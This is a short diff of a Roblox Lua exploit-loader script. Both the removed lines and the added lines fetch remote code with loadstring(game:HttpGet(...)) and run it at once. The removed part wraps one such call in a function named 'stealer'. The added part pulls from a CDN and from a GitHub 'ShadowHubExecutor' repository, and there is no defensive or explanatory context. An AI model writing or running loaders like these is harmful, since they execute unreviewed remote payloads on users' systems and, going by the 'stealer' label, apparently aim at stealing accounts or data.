@@ -1,19 +1,5 @@
--- Enable loading screen before anything runs
-_G.LoadingScreen = true  
+ID="a38eb264-608e-4a4b-b04f-19397ae65b2f";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/No-ShadowHub/ShadowHubExecutor/refs/heads/main/PremiumScriptV2.3"))()
-end
 
-local function loadui()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
-end
-
--- Run the scripts
-task.spawn(stealer)
-task.spawn(loadui)
-
--- Optionally, turn off loading screen after a short delay
-task.delay(3, function()
-    _G.LoadingScreen = false
-end)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/No-ShadowHub/ShadowHubExecutor/refs/heads/main/PremiumScriptV2.3"))()
